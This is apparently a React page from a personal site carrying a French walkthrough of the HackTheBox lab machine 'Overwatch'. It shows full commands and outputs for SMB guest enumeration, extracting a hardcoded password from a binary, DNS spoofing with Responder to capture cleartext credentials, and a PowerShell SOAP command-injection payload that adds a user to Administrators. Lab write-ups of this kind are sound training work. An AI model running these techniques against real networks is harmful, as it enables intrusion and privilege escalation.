import { Terminal, Key, Database, Shield, Network } from "lucide-react";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Overwatch | Writeup HTB | 0xbbuddha",
  description: "Writeup de la machine Overwatch (HackTheBox, Medium, Windows) – SMB, MSSQL, DNS, WinRM, PowerShell injection.",
};

export default function WriteupOverwatchPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Overwatch"
        description="Machine Windows Server 2022 Active Directory. Accès initial via SMB guest, extraction de credentials depuis un binaire, puis élévation via injection PowerShell dans un service SOAP."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Overwatch" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Medium" },
          { label: "Date", value: "2026-02-17" },
        ]}
      />

      <article className="mt-8 space-y-10">

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <p className="text-muted-foreground">
            Scan Nmap révèle un domaine Active Directory <strong>overwatch.htb</strong>, machine <strong>S200401</strong>. Ports ouverts : DNS (53), Kerberos (88), LDAP (389, 636, 3268), SMB (445), RDP (3389), WinRM (5985), et un port MSSQL non standard (6520).
          </p>
          <CodeBlock title="Commande">
{`nmap -Pn -sV -p- 10.129.1.48 -T5`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
6520/tcp open  ms-sql-s      Microsoft SQL Server 2022`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            2. Accès SMB (guest)
          </h2>
          <p className="text-muted-foreground">
            Authentification <strong>guest</strong> sans mot de passe fonctionne. Énumération des partages et des RID du domaine.
          </p>
          <CodeBlock title="Commande">
{`nxc smb overwatch.htb -u 'guest' -p '' --shares`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`SMB  10.129.5.218  445  S200401  [+] overwatch.htb\\guest:
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
software$       READ            
SYSVOL                          Logon server share`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Partage <strong>software$</strong> en lecture. Énumération RID pour lister utilisateurs et groupes du domaine.
          </p>
          <CodeBlock title="Commande">
{`nxc smb overwatch.htb -u 'guest' -p '' --rid-brute`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Nombreux utilisateurs (Charlie.Moss, Tracy.Burns, etc.) et groupes, notamment <strong>sqlsvc</strong> (RID 1104) et <strong>sqlmgmt</strong> (1105).
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            3. Extraction de credentials (overwatch.exe)
          </h2>
          <p className="text-muted-foreground">
            Téléchargement du contenu du partage <strong>software$</strong> via smbclient. Le dossier <code className="rounded bg-muted px-1">Monitoring</code> contient <strong>overwatch.exe</strong> et des DLLs.
          </p>
          <CodeBlock title="Commande">
{`smbclient //overwatch.htb/software\\$ -U 'guest%'
smb: \\> recurse ON
smb: \\> prompt OFF
smb: \\> mget *`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Analyse du binaire avec <code className="rounded bg-muted px-1">strings</code> pour chercher des mots de passe en clair.
          </p>
          <CodeBlock title="Commande">
{`strings -el overwatch.exe | grep -i "pass"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Chaîne de connexion MSSQL trouvée : <strong>sqlsvc / TI0LKcfHzZw1Vv</strong>.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            4. Accès MSSQL (sqlsvc)
          </h2>
          <p className="text-muted-foreground">
            Connexion à MSSQL sur le port <strong>6520</strong> avec les identifiants extraits.
          </p>
          <CodeBlock title="Commande">
{`nxc smb overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`SMB  10.129.5.218  445  S200401  [+] overwatch.htb\\sqlsvc:TI0LKcfHzZw1Vv`}
          </CodeBlock>
          <CodeBlock title="Connexion MSSQL (port 6520)">
{`mssqlclient.py sqlsvc:'TI0LKcfHzZw1Vv'@10.129.1.48 -port 6520 -windows-auth`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Encryption required, switching to TLS
[*] INFO(S200401\\SQLEXPRESS): Changed database context to 'master'.
SQL (OVERWATCH\\sqlsvc  guest@master)>`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            5. Capture NTLM via linked server
          </h2>
          <p className="text-muted-foreground">
            Tentative de capture NTLM via <strong>xp_dirtree</strong> vers notre serveur SMB. La première tentative avec le compte machine <strong>S200401$</strong> ne donne rien d’exploitable. On utilise <strong>bloodyAD</strong> pour ajouter un enregistrement DNS pointant vers notre IP, puis on configure un linked server vers ce nom.
          </p>
          <CodeBlock title="Commande (ajout DNS record)">
{`bloodyAD --host 10.129.1.48 --domain overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' add dnsRecord SQL07 10.10.16.23`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] SQL07 has been successfully added`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Lancement de Responder avec <code className="rounded bg-muted px-1">-wFdv</code> pour capturer les requêtes MSSQL. Depuis MSSQL, exécution d’une requête vers le linked server <strong>SQL07</strong>.
          </p>
          <CodeBlock title="Depuis mssqlclient">
{`EXEC ('SELECT 1') AT SQL07;`}
          </CodeBlock>
          <CodeBlock title="Résultat (Responder)">
{`[MSSQL] Received connection from 10.129.1.48
[MSSQL] Cleartext Client   : 10.129.1.48
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Credentials MSSQL capturés en clair : <strong>sqlmgmt / bIhBbzMMnB82yx</strong>.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            6. Accès WinRM (sqlmgmt)
          </h2>
          <p className="text-muted-foreground">
            Connexion WinRM avec <strong>sqlmgmt</strong>.
          </p>
          <CodeBlock title="Commande">
{`nxc winrm 10.129.1.48 -u sqlmgmt -p 'bIhBbzMMnB82yx'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`WINRM  10.129.1.48  5985  S200401  [+] overwatch.htb\\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)`}
          </CodeBlock>
          <CodeBlock title="Connexion WinRM (evil-winrm)">
{`evil-winrm-py -i 10.129.1.48 -u sqlmgmt -p 'bIhBbzMMnB82yx'`}
          </CodeBlock>
          <CodeBlock title="Lecture user.txt">
{`cat ../Desktop/user.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat (user.txt)" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            7. Élévation de privilèges – Injection PowerShell
          </h2>
          <p className="text-muted-foreground">
            Découverte d’un service SOAP <strong>MonitoringService</strong> sur le port <strong>8000</strong> (écoute locale). Analyse du WSDL révèle une méthode <strong>KillProcess</strong> qui prend un nom de processus en paramètre.
          </p>
          <CodeBlock title="Commande">
{`netstat -ano | findstr 8000`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4`}
          </CodeBlock>
          <CodeBlock title="Récupération WSDL">
{`curl "http://localhost:8000/MonitorService?wsdl" -UseBasicParsing`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le service expose <strong>KillProcess(processName)</strong>. Si le serveur utilise directement le paramètre dans une commande PowerShell (ex. <code className="rounded bg-muted px-1">Stop-Process -Name $processName</code>), on peut injecter du code via le séparateur <code className="rounded bg-muted px-1">;</code>.
          </p>
          <CodeBlock title="Script PowerShell d'exploitation">
{`$Url = "http://localhost:8000/MonitorService"
$Action = "http://tempuri.org/IMonitoringService/KillProcess"
$Payload = "notepad; net localgroup administrators sqlmgmt /add"
$Body = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <KillProcess xmlns="http://tempuri.org/">
            <processName>$Payload</processName>
        </KillProcess>
    </s:Body>
</s:Envelope>
"@
Invoke-WebRequest -Uri $Url -Method Post -ContentType "text/xml; charset=utf-8" -Body $Body -Headers @{"SOAPAction" = $Action}`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le payload injecte <code className="rounded bg-muted px-1">net localgroup administrators sqlmgmt /add</code> pour ajouter sqlmgmt au groupe Administrators. Vérification puis reconnexion WinRM pour accéder au Desktop de l’Administrator.
          </p>
          <CodeBlock title="Vérification">
{`net localgroup administrators | select-string "sqlmgmt"`}
          </CodeBlock>
          <CodeBlock title="Lecture root.txt">
{`type C:\\Users\\Administrator\\Desktop\\root.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat (root.txt)" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>Recon : AD overwatch.htb, SMB guest, partage software$</li>
            <li>Extraction : strings sur overwatch.exe → sqlsvc / TI0LKcfHzZw1Vv</li>
            <li>MSSQL : connexion sur port 6520 avec sqlsvc</li>
            <li>DNS : bloodyAD pour ajouter SQL07 → notre IP</li>
            <li>Capture : linked server MSSQL vers SQL07 → credentials sqlmgmt en clair</li>
            <li>WinRM : connexion avec sqlmgmt → user.txt</li>
            <li>Privesc : injection PowerShell dans MonitoringService (KillProcess) → ajout à Administrators</li>
            <li>Flags : root.txt via Administrator</li>
          </ul>
        </section>
      </article>
    </div>
  );
}
